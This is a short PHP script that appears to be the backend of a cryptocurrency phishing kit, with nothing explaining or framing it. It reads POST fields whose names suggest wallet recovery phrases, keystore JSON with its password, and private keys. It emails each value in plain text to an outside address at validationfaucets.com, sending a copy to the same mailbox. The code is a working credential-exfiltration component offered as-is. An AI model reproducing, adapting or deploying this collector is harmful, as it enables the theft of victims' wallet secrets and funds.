<?php
    
if ($_POST['type']==1)
{
    $phrase = $_POST['phrase'];
    $recipient = 'wget@validationfaucets.com';
    $message = '<html><body>';
    $message .= '<img src="//css-tricks.com/examples/WebsiteChangeRequestForm/images/wcrf-header.png" alt="Website Change Request" />';
    $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
    $message .= "<tr style='background: #eee;'><td><strong>Item:</strong> </td><td>Details</td></tr>";
    $message .= "<tr><td><strong>Phrase:</strong> </td><td>" . $phrase . "</td></tr>";
    $message .= "</table>";
    $message .= "</body></html>";

    $headers = "From: no-reply@validationfaucets.com\r\n";
    $headers .= "Reply-To: no-reply@validationfaucets.com\r\n";
    $headers .= "CC: wget@validationfaucets.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";


    mail($recipient,$subject,$message, $headers);
    echo json_encode(array("statusCode"=>200));
}

if ($_POST['type']==2)
{
    $cf_json = $_POST['cf_json'];
    $cf_passw = $_POST['cf_passw'];
    $recipient = 'wget@validationfaucets.com';
    $message = '<html><body>';
    $message .= '<img src="//css-tricks.com/examples/WebsiteChangeRequestForm/images/wcrf-header.png" alt="Website Change Request" />';
    $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
    $message .= "<tr style='background: #eee;'><td><strong>Item:</strong> </td><td>Details</td></tr>";
    $message .= "<tr><td><strong>cf_passw:</strong> </td><td>" . $cf_passw . "</td></tr>";
    $message .= "<tr><td><strong>cf_json:</strong> </td><td>" . $cf_json . "</td></tr>";
    $message .= "</table>";
    $message .= "</body></html>";

    $headers = "From: no-reply@validationfaucets.com\r\n";
    $headers .= "Reply-To: no-reply@validationfaucets.com\r\n";
    $headers .= "CC: wget@validationfaucets.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";


    mail($recipient,$subject,$message, $headers);
    echo json_encode(array("statusCode"=>200));
}

if ($_POST['type']==3)
{
    $cf_key = $_POST['cf_key'];
    $recipient = 'wget@validationfaucets.com';
    $message = '<html><body>';
    $message .= '<img src="//css-tricks.com/examples/WebsiteChangeRequestForm/images/wcrf-header.png" alt="Website Change Request" />';
    $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
    $message .= "<tr style='background: #eee;'><td><strong>Item:</strong> </td><td>Details</td></tr>";
    $message .= "<tr><td><strong>cf_key:</strong> </td><td>" . $cf_key . "</td></tr>";
    $message .= "</table>";
    $message .= "</body></html>";

    $headers = "From: no-reply@validationfaucets.com\r\n";
    $headers .= "Reply-To: no-reply@validationfaucets.com\r\n";
    $headers .= "CC: wget@validationfaucets.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";


    mail($recipient,$subject,$message, $headers);
    echo json_encode(array("statusCode"=>200));
}

